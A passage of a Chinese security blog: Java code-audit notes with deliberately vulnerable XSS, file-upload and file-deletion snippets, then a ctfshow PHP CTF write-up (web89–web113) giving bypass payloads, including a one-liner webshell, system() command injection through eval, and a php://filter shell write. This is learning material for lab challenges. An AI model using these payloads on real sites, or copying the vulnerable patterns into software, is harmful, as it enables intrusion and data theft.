class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">前端反射型xss   (name参数可控) </span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">String name = request.getParameter(&quot;name&quot;);</span><br><span class=\"line\">out.println(name)</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">后端反射型 xss  (msg参数可控) </span><br><span class=\"line\">public void Message(HttpServletRequest req, HttpServletResponse resp) &#123;</span><br><span class=\"line\">\tString message = req.getParameter(&quot;msg&quot;);</span><br><span class=\"line\">try&#123;</span><br><span class=\"line\">\tresp.getWriter().print(message);</span><br><span class=\"line\">&#125; catch (IOException e) &#123;</span><br><span class=\"line\">\te. printStackTrace();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">DOM xss只发生在客户端处理数据阶段，未经过滤被传入存在缺陷的JavaScript代码处理。</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    var pos = document.URL.indexOf(&quot;#&quot;)+1;</span><br><span class=\"line\">    var name = document.URL.substring(pos, document.URL.length);</span><br><span class=\"line\">    document.write(name);</span><br><span class=\"line\">eval(&quot;var a = &quot; + name);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">储存型xss 会通过JDBC与数据库交互</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"6-Java-常用的文件操作方法\"><a href=\"#6-Java-常用的文件操作方法\" class=\"headerlink\" title=\"6.Java 常用的文件操作方法\"></a>6.Java 常用的文件操作方法</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Files.readAllBytes、Files.readAllLines</span><br><span class=\"line\">FileInputStream</span><br><span class=\"line\">FileOutputStream</span><br><span class=\"line\">File</span><br><span class=\"line\">FileUtils</span><br><span class=\"line\">IOUtils</span><br><span class=\"line\">BufferedReader</span><br><span class=\"line\">ServletFileUpload</span><br><span class=\"line\">MultipartFile</span><br><span class=\"line\">CommonsMultipartFile</span><br><span class=\"line\">PrintWriter</span><br><span class=\"line\">ZipInputStream</span><br><span class=\"line\">ZipEntry.getSize</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"7-文件上传关键函数\"><a href=\"#7-文件上传关键函数\" class=\"headerlink\" title=\"7.文件上传关键函数\"></a>7.文件上传关键函数</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DiskFileItemFactory@MultipartConfigMultipartFileFile</span><br><span class=\"line\">Upload</span><br><span class=\"line\">InputStream</span><br><span class=\"line\">OutputStream</span><br><span class=\"line\">write</span><br><span class=\"line\">fileName</span><br><span class=\"line\">filePath</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"8-servlet文件上传函数\"><a href=\"#8-servlet文件上传函数\" class=\"headerlink\" title=\"8.servlet文件上传函数\"></a>8.servlet文件上传函数</h3><blockquote>\n<p>servlet3之前<br>使用commons-fileupload、commons-io这两个jar包来处理文件上传</p>\n<p>servlet3之后<br>使用request.getParts()获取上传文件</p>\n</blockquote>\n<h3 id=\"9-java任意文件上传\"><a href=\"#9-java任意文件上传\" class=\"headerlink\" title=\"9.java任意文件上传\"></a>9.java任意文件上传</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private boolean uploadWithAnnotation(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException &#123;</span><br><span class=\"line\">    Part part = request.getPart(&quot;fileName&quot;);</span><br><span class=\"line\">    if(part == null) &#123;</span><br><span class=\"line\">      return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    String filename = UPLOAD_PATH + File.separator + part.getSubmittedFileName();</span><br><span class=\"line\">    part.write(filename);</span><br><span class=\"line\">    part.delete();</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"10-任意文件删除\"><a href=\"#10-任意文件删除\" class=\"headerlink\" title=\"10.任意文件删除\"></a>10.任意文件删除</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String filename = request.getParameter(&quot;filename&quot;);</span><br><span class=\"line\">File file = new File(filename);</span><br><span class=\"line\">if(file != null &amp;&amp; file.exists() &amp;&amp; file.delete()) &#123;</span><br><span class=\"line\">  \tresponse.getWriter().println(&quot;delete success&quot;);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">  \tresponse.getWriter().println(&quot;delete failed&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"PHP特性","date":"2022-03-21T13:23:21.000Z","excerpt":"PHP特性","_content":"\n# PHP特性\n\nphp特性这个东西很杂，覆盖的内容也很多，都是一些零碎的知识点，这次正好借这个刷题的机会，做一个小复习\n\n\n\n### web89\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if(preg_match(\"/[0-9]/\", $num)){\n        die(\"no no no!\");\n    }\n    if(intval($num)){\n        echo $flag;\n    }\n}\n```\n\n这里`preg_match(\"/[0-9]/\", $num`过滤了数字，但是\n\n我们要让`intval($num)`为真，这题考的就是`intval`的特性\n\n\n\n**intval()的测试**\n\n> 返回值 \n> 成功时返回 var 的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array \n> 返回 1。 \n\n测试了一下\n\n```\n<?php\n\necho intval(1234);  //1234\necho \"\\n\";\necho intval(042);  //34  0开头的，当成了8进制\necho \"\\n\";\necho intval(0x1a);  //26 0x开头，当成16进制\necho \"\\n\";\necho intval(3e3);  //3000 科学计数法 3 X 10的三次方\necho \"\\n\";\necho intval('3e3');  //3000\necho \"\\n\";\necho intval(\"1234a\");  //1234\necho \"\\n\";\necho intval(4.2); //转化为整数\n```\n\n回到题目\n\n可以用数组绕过\n\n```\n?num[]=a\n```\n\n\n\n### web90\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n} \n```\n\n与上题类似，但这次没过滤数字\n\n这里又要说一下`intval`的相关特性\n\n```\nintval ( mixed $var [, int $base = 10 ] )\n```\n\n> 如果 `base` 是 0，通过检测 `var` 的格式来决定使用的进制：\n>\n> - 如果字符串包括了 \"0x\" (或 \"0X\") 的前缀，使用 16 进制 (hex)；否则，\n> - 如果字符串以 \"0\" 开始，使用 8 进制(octal)；否则，\n> - 将使用 10 进制 (decimal)。\n\n```\nintval('4476a',0)=4476\nintval('010574',0)=4476\nintval('0x117c',0)=4476\n```\n\n上述三中均能绕过\n\n\n\n### web91\n\n```\nshow_source(__FILE__);\ninclude('flag.php');\n$a=$_GET['cmd'];\nif(preg_match('/^php$/im', $a)){\n    if(preg_match('/^php$/i', $a)){\n        echo 'hacker';\n    }\n    else{\n        echo $flag;\n    }\n}\nelse{\n    echo 'nonononono';\n} \n```\n\n我们先来看看 `正则匹配修饰符`\n\n```\ni 不区分(ignore)大小写；\ng 全局(global)匹配\nm 多(more)行匹配\ns 特殊字符圆点 . 中包含换行符\nU 只匹配最近的一个字符串;不重复匹配; \n//修正符:x 将模式中的空白忽略; \n//修正符:A 强制从目标字符串开头匹配;\n//修正符:D 如果使用$限制结尾字符,则不允许结尾有换行; \n//修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;  \n```\n\n`(preg_match('/^php$/im', $a))`这个匹配以php开头的字符串并且多行匹配\n\n`(preg_match('/^php$/i', $a))`这个也是匹配以php开头的字符串，但不支持多行匹配，只能匹配一行\n\n\n\n> preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾\n\n\n\n`%0a`换行，相当于enter\n\n**payload**\n\n```\n?cmd=%0aphp\n或?cmd=php%0a1   (但php%0a不行)\n```\n\n这里我有个小小的疑惑点，针对第一个 `%0aphp`显然这里是匹配的第一行，第二个payload `php%0a1`，显然这里匹配的是第二行，所以具体的匹配机制有点没懂\n\n请假了一下群里的师傅这里主要跟`^php$`这个有关，`(preg_match('/^php$/i', $a))`这个以一整行为一个整体进行判断，经过测试这个只匹配第一行\n\n\n\n### web92\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)==4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n}\n```\n\n\n\n> intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法\n\n所以我们可以用e绕过也可以用二进制（0b），十六进制（0x）绕过\n\n**payload**\n\n```\n?num=0b1000101111100\n?num=0x117c\n?num=4476e123\n```\n\n\n\n### web93\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]/i\", $num)){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)==4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    } \n```\n\n比上一题多过滤了一个字母，这样我们e和二进制，十六进制都用不了，\n\n八进制是以数字0开头的，刚好可以绕过\n\n```\n?num=010574\n```\n\n\n\n### web94\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]/i\", $num)){\n        die(\"no no no!\");\n    }\n    if(!strpos($num, \"0\")){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }\n}\n```\n\n这一题相对于上一题，不让数字0出现在第一位,而且第一个if是`===`强比较\n\n我们可以用小数 `4476.0`绕过 或者\n\n```\n?num=4476.0\n```\n\n可以在前面加上一个加号，当空格\n\n```\n?num=+010574\n?num= 010574//空格也可以\n```\n\n\n\n### web95\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]|\\./i\", $num)){\n        die(\"no no no!!\");\n    }\n    if(!strpos($num, \"0\")){\n        die(\"no no no!!!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }\n}\n```\n\n这里第一个判断又换成弱比较了，只能用 空格和 `+` 绕过\n\n```\n?num= 010574\n?num=+010574\n```\n\n\n\n### web96\n\n```\nhighlight_file(__FILE__);\n\nif(isset($_GET['u'])){\n    if($_GET['u']=='flag.php'){\n        die(\"no no no\");\n    }else{\n        highlight_file($_GET['u']);\n    }\n\n\n} \n```\n\n这题没什么过滤直接读当前目录下的flag.php就好\n\n```\n?u=./flag.php\n```\n\n或者用伪协议读取也行\n\n```\n?u=php://filter/resource=flag.php\n```\n\n\n\n### web97\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif (isset($_POST['a']) and isset($_POST['b'])) {\nif ($_POST['a'] != $_POST['b'])\nif (md5($_POST['a']) === md5($_POST['b']))\necho $flag;\nelse\nprint 'Wrong.';\n}\n?> \n```\n\n题目需要我们用post方式传入a和b，并且a!=b（这里是弱比较）\n\n但这里`md5($_POST['a']) === md5($_POST['b'])`这里我们可以利用一个字符串比较的一个特性\n\n> MD5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回NULL\n\n```\na[]=1&b[]=2\n```\n\n\n\n### web98\n\n```\ninclude(\"flag.php\");\n$_GET?$_GET=&$_POST:'flag';\n$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';\n$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';\nhighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n\n?> \n```\n\n```\n`$_GET?$_GET=&$_POST:'flag';` \n```\n\n这句话解释一下，这是三目运算符\n\n当存在GET传参时，则把post传参地址给get，如果不存在则传的参数为flag\n\n```\n$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';\n```\n\n如果传的flag='flag',则把COOKIE传参地址给get,否则让其等于'flag'\n\n```\n$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag'; \n```\n\n如果传的flag='flag',则把SERVER传参地址给get,否则让其等于'flag'\n\n```\n$_GET['HTTP_FLAG']=='flag'?$flag:__FILE__\n```\n\n如果传入的HTTP_FLAG=‘flag'显示$flag，否则显示当前页面\n\n\n\n如果我们直接用get方式传入\n\n```\n?HTTP_FLAG=flag\n```\n\n由于存在GET传参，会把post传参地址给get\n\n所以这里我们随便用get方式传入一个，然后用post覆盖掉\n\n```\n?num=1111\n\npost:HTTP_FLAG=flag\n```\n\n即可highlight_file($flag)，因为$flag不是php文件，所以会导致报错而回显$flag的值\n\n\n\n### web99\n\n```\nhighlight_file(__FILE__);\n$allow = array();\nfor ($i=36; $i < 0x36d; $i++) { \n    array_push($allow, rand(1,$i));\n}\nif(isset($_GET['n']) && in_array($_GET['n'], $allow)){\n    file_put_contents($_GET['n'], $_POST['content']);\n}\n\n?> \n```\n\n`array_push`\n\n> array_push — 将一个或多个单元压入数组的末尾（入栈）\n\n`in_array`\n\n> 检查数组中是否存在某个值，如果没有设置第三个参数，则使用宽松的比较，先将字符串转化为i数字，再比较\n\n分析一下题目首先将许多随机数放入数组中，然后当传入的n在数组中，将content写入传入的n中\n\n由于这里循环了很多次，出现1的概率比较大（多试几次总能成功）\n\n然后是 1.php在进行判断时 `1.php == 1`\n\n并将一句话木马写入content\n\n```\n?n=1.php\n\nPOST:content=<?php @eval($_POST[1]);?>\n```\n\n蚁剑连接即可\n\n\n\n### web100\n\n```\nhighlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1=$_GET['v1'];\n$v2=$_GET['v2'];\n$v3=$_GET['v3'];\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif($v0){\n    if(!preg_match(\"/\\;/\", $v2)){\n        if(preg_match(\"/\\;/\", $v3)){\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n    \n} \n```\n\n`is_numeric`\n\n> — 检测变量是否为数字或数字字符串\n\n这个题第一次做的时候时非常懵逼的\n\n这题的解题点在\n\n```\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\n```\n\n这里就要讲一下运算符的优先级问题了\n\n```\n&& --> || --> = --> and --> or\n```\n\n所以题目这里赋值的优先级大于and，即\n\n```\n$v0=is_numeric($v1)\n```\n\n所以这里我们只需要让v1为数字，后面两个参数可控，v2,v3过滤了分号，\n\n现在就要解决\n\n```\neval(\"$v2('ctfshow')$v3\");\n```\n\n突然发现题目注释里有  `flag in class ctfshow; `\n\n我这里直接用管道符了`||`\n\n```\n?v1=1&v2=system(\"cat ctfshow.php\")||&v3=;\n```\n\n\n\n### web101\n\n```\nhighlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1=$_GET['v1'];\n$v2=$_GET['v2'];\n$v3=$_GET['v3'];\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif($v0){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\;|\\?|[0-9]/\", $v2)){\n        if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\?|[0-9]/\", $v3)){\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n    \n} \n```\n\n这个题相比上个，增加了许多过滤\n\n主要还是构造\n\n```\neval(\"$v2('ctfshow')$v3\"); \n```\n\n这里也是看了很多师傅的wp才理解，需要讲一下\n\n`ReflectionClasss`\n\n> 反射类ReflectionClass执行命令\n>\n> ReflectionClass反射类在PHP5新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作\n> 反射类不仅仅可以建立对类的映射，也可以建立对PHP基本方法的映射，并且返回基本方法执行的情况。因此可以通过建立反射类new ReflectionClass(system('cmd'))来执行命令\n\n\n\n**payload**\n\n```\n?v1=1&v2=echo new ReflectionClass&v3=;\n```\n\n最后将 0x2d改为 -  ，发现只有35位，没想到最后一位要爆破。。。看运气咯\n\n\n\n### web102\n\n```\nhighlight_file(__FILE__);\n$v1 = $_POST['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v4 = is_numeric($v2) and is_numeric($v3);\nif($v4){\n    $s = substr($v2,2);\n    $str = call_user_func($v1,$s);\n    echo $str;\n    file_put_contents($v3,$str);\n}\nelse{\n    die('hacker');\n}\n\n\n?>\n```\n\n`substr`\n\n> **substr** ( string `$string` , int `$start` [, int `$length` ] ) : string\n>\n> 返回字符串 `string` 由 `start` 和 `length` 参数指定的子字符串。\n\n这里 `$s = substr($v2,2);`截取了v2的[2:],从第三个字符到末尾\n\n`call_user_func`\n\n> **call_user_func** ( [callable](php/language.types.callable.html) `$callback` [, [mixed](php/language.pseudo-types.html#language.types.mixed) `$parameter` [, [mixed](php/language.pseudo-types.html#language.types.mixed) `$...` ]] ) : [mixed](php/language.pseudo-types.html#language.types.mixed)\n>\n> 第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。\n\n这里v1，v3可控，v2要保证能写shell，又要保证能为数字。\n\n这里百思不得其解，看了师傅的wp后，真的要感叹一下，师傅们的创造力啊！\n\n```\n<?=`tac *`;  \n```\n\n这是我们要执行的命令，进行hex编码后为：3c3f3d60746163202a603b ，发现其中有字母\n于是在此之前进行base64编码一次\n\n```\nPD89YHRhYyAqYDs= //在进行hex编码\n```\n\n```\n5044383959485268597941715944733d\n```\n\n这时我们发现 `3d`为等号\n\n即v1=hex2bin  v2=00504438395948526859794171594473  v3=php://1.php\n\n**payload**\n\n```\nPOST:v1=hex2bin\n\n?v2=00504438395948526859794171594473&v3=php://filter/write=convert.base64-decode/resource=1.php\n```\n\n太妙了！！\n\n\n\n### web103\n\n```\nhighlight_file(__FILE__);\n$v1 = $_POST['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v4 = is_numeric($v2) and is_numeric($v3);\nif($v4){\n    $s = substr($v2,2);\n    $str = call_user_func($v1,$s);\n    echo $str;\n    if(!preg_match(\"/.*p.*h.*p.*/i\",$str)){\n        file_put_contents($v3,$str);\n    }\n    else{\n        die('Sorry');\n    }\n}\nelse{\n    die('hacker');\n} \n```\n\n过滤的更加多了，用上一题的思路也能解出来，我换一个吧\n\n```\n<?=`cat *`;\n```\n\n转化为base64\n\n```\nPD89YGNhdCAqYDs\n```\n\n再转化为ascii的十六进制\n\n```\n5044383959474e6864434171594473\n```\n\n我们发现这个很巧妙的里面只有一个字母e，但这里可以将其当成科学计数法，\n\npayload\n\n```\n?v2=005044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php\n```\n\n\n\n### web104\n\n```\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n\nif(isset($_POST['v1']) && isset($_GET['v2'])){\n    $v1 = $_POST['v1'];\n    $v2 = $_GET['v2'];\n    if(sha1($v1)==sha1($v2)){\n        echo $flag;\n    }\n} \n```\n\n数组绕过，sha(a[])会返回null  而null==null\n\n\n\n### web105\n\n```\nhighlight_file(__FILE__);\ninclude('flag.php');\nerror_reporting(0);\n$error='你还想要flag嘛？';\n$suces='既然你想要那给你吧！';\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}foreach($_POST as $key => $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}\nif(!($_POST['flag']==$flag)){\n    die($error);\n}\necho \"your are good\".$flag.\"\\n\";\ndie($suces); \n```\n\n这题其实第一做的时候挺懵逼的，后来仔细理清了一下思路，其实就是简单的变量覆盖\n\n```\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value; \n```\n\n这里将我们用GET方式传入的参数当成KEY，参数的值作为VALUE\n\n最后这里 `$$key=$$value;` 这里key不能等于error，于是\n\n我们传入 `suces=flag`\n\n这样 `$suces=$flag`这里我们成功将flag的值传给了suces，接下来我们再将seces的值传给error\n\n同理，我们用post方式传入 `error=suces`\n\n```\n$errot=$suces=$flag\n```\n\n最后由于不成立\n\n```\nif(!($_POST['flag']==$flag)){\n    die($error); \n```\n\n将error打印出来，此时error的值就是flag\n\n**payload**\n\n```\n?suces=flag\n\nPOST:error=suces\n```\n\n\n\n### web106\n\n```\ninclude(\"flag.php\");\n\nif(isset($_POST['v1']) && isset($_GET['v2'])){\n    $v1 = $_POST['v1'];\n    $v2 = $_GET['v2'];\n    if(sha1($v1)==sha1($v2) && $v1!=$v2){\n        echo $flag;\n    }\n} \n```\n\n数组绕过，这里不重复讲了。。\n\n\n\n### web107\n\n```\ninclude(\"flag.php\");\n\nif(isset($_POST['v1'])){\n    $v1 = $_POST['v1'];\n    $v3 = $_GET['v3'];\n       parse_str($v1,$v2);\n       if($v2['flag']==md5($v3)){\n           echo $flag;\n       }\n\n} \n```\n\n`parse_str`\n\n> **parse_str** ( string `$encoded_string` [, array `&$result` ] ) : void\n>\n> 如果 `encoded_string` 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 `result` 则会设置到该数组里 ）。\n\n这里我们传入v3=flag\n\n`v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc`（其实就是flag经过md5后的值）\n\n**payload**\n\n```\n?v3=flag\nPOST:v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc\n```\n\n另一种思路 md5一个数组的值为null，如果v2这个数组中的flag值也为null，null==null\n\n```\n?v3[]=\nPOST:V1=\n```\n\n\n\n### web108\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\n\nif (ereg (\"^[a-zA-Z]+$\", $_GET['c'])===FALSE)  {\n    die('error');\n\n}\n//只有36d的人才能看到flag\nif(intval(strrev($_GET['c']))==0x36d){\n    echo $flag;\n}\n```\n\n其实这个题就考了一个知识点\n\nereg函数可以用%00截断\n\npayload\n\n```\n?c=a%00778\n```\n\n\n\n### web109\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){\n            eval(\"echo new $v1($v2());\");\n    }\n\n} \n```\n\n正则匹配要求v1和v2要包含字母。题目中eval里的语句，和之前web101有点相似。\n初始化$v1，v1是个类，$v2()是参数。\n\n这道题用到了魔术方法__toString()，不少php的内置类里都包含有这个方法，如Reflectionclass、Exception、Error\n`__toString()`：当一个对象被当作字符串对待的时候，会触发这个魔术方法，格式化输出这个对象所包含的数据。\n\n> PHP5.2.0之前，__toString() 方法只在使用 echo 或 print 时才生效。PHP5.2.0之后，可以在任何字符串环境生效\n\n所以echo使得`$v1`类触发`__toString()`，传递的参数v2会被输出。\n\n**payload**\n\n```\n?v1=CachingIterator&v2=system(ls)\n?v1=Exception&v2=system('cat fl36dg.txt') \n```\n\n\n\n### web110\n\n```\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v2)){\n            die(\"error v2\");\n    }\n\n    eval(\"echo new $v1($v2());\");\n\n} \n```\n\n以使用FilesystemIterator文件系统迭代器来进行利用，通过新建FilesystemIterator，使用getcwd()来显示当前目录下的文件结构\n\n**payload**\n\n```\n?v1=FilesystemIterator&v2=getcwd\n```\n\n回显fl36dga.txt\n\n访问url/fl36dga.txt得到flag\n\n其实这里的`FilesystemIterator`没咋弄懂，还需要找师傅请教一下\n\n后续\n\n稍微懂了一点\n\n> 通过新建FilesystemIterator，可以显示当前目录下的文件结构。由于参数内部有个括号，所以不能使用字符串来索引路径，而是要通过拼接方法getcwd()来获取当前的路径\n\n```\n<?php\n\terror_reporting(0);\n\techo getcwd().PHP_EOL;\n\techo new FilesystemIterator('./').PHP_EOL;\n\techo new FilesystemIterator(getcwd());\n?>\n输出为\nD:\\PHP\n  index.php\n  index.php\n```\n\n\n\n### web111\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\n\nfunction getFlag(&$v1,&$v2){\n    eval(\"$$v1 = &$$v2;\");\n    var_dump($$v1);\n}\n\n\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\<|\\>/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\<|\\>/', $v2)){\n            die(\"error v2\");\n    }\n    \n    if(preg_match('/ctfshow/', $v1)){\n            getFlag($v1,$v2);\n    }\n     \n```\n\n当v1传入ctfshow，执行getFlag函数\n\n```\neval(\"$$v1 = &$$v2;\");\n    var_dump($$v1);\n```\n\n也就是$ctfshow=$$v2,然后将$$v1打印出来\n\n我们另`v2=GLOBALS`\n\n```\nvar_dump($GLOBALS);\n```\n\npayload\n\n```\n?v1=ctfshow&v2=GLOBALS\n```\n\n\n\n### web112\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($file){\n    if(preg_match('/\\.\\.\\/|http|https|data|input|rot13|base64|string/i',$file)){\n        die(\"hacker!\");\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n}\n```\n\n`is_file`\n\n> 判断给定文件名是否为一个正常的文件。\n\nis_file用php伪协议即可绕过\n\npayload\n\n```\n?file=php://filter/resource=flag.php\n```\n\n\n\n### web113\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($file){\n    if(preg_match('/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){\n        die('hacker!');\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n\n```\n\n这题过滤掉了filter，这个协议就用不了，这里增加一点知识点\n\n**linux里`/proc/self/root`是指向根目录的**\n\n也就是如果在命令行中输入`ls /proc/self/root`，其实显示的内容是根目录下的内容\n\n这里我们多次重复即可绕过`is_file`\n\npayload\n\n```\n?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n```\n\n另一种解法\n\n```\ncompress.zlib://flag.php\n```\n\n应该是把flag.php当成压缩文件来读取，具体的不知道。\n\n\n\n### 